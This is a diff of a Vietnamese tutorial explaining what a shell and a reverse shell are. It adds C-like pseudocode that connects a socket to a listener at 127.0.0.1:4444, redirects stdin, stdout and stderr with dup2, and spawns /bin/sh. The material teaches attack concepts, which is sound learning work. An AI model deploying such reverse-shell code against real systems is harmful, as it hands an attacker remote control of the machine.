@@ -1,10 +1,10 @@
 ## Reverse shell
 ___
-**Shell là gì?**
+### **Shell là gì?**
 
 Shell là một phần mềm cho phép người dùng tương tác với các dịch vụ, tài nguyên của hệ điều hành thông qua giao diện CLI hoặc là terminal. Shell được gọi là vỏ bọc cho hệ điều hành.
 
-**Reverse shell:**
+### **Reverse shell:**
 
 Reverse shell là khi thay vì người dùng chủ động mở phiên kết nối đến một server đang nghe (giống việc sử dụng ssh, telnet,...) thì ở đây quy trình được đảo ngược lại. Vai trò của người dùng bây giờ là lắng nghe các kết nối, còn server sẽ có vai trò là kết nối đến máy chủ của người dùng.
 
@@ -32,6 +32,22 @@ Attacker Machine -------- shell CLI -------> Server Machine
 ```
 <img width="438" height="178" alt="image" src="https://github.com/user-attachments/assets/a582c7ab-504a-4e78-8c19-ef2c0a0f2dae" />
 
+### Ví dụ:
+Ta biểu diễn chương trình kết nối và gửi shell về máy chủ người dùng qua mã giả tựa c:
+```c
+sock = socket();
+connect(sock, 127.0.0.1:4444);
+
+dup2(sock, 0);  // stdin  -> socket
+dup2(sock, 1);  // stdout -> socket
+dup2(sock, 2);  // stderr -> socket
+
+execve("/bin/sh", NULL, NULL);
+```
+* tạo socket - mở pipe kết nối
+* kết nối từ server đến máy chủ user với socket được tạo
+* đưa các quy chuẩn input/output về cho socket; để khi nhận được shell, nó gửi về user machine thay vì chạy trên localhost (server machine)
+* thực hiện `/bin/sh` lấy shell
 ___
 Tài liệu:
 
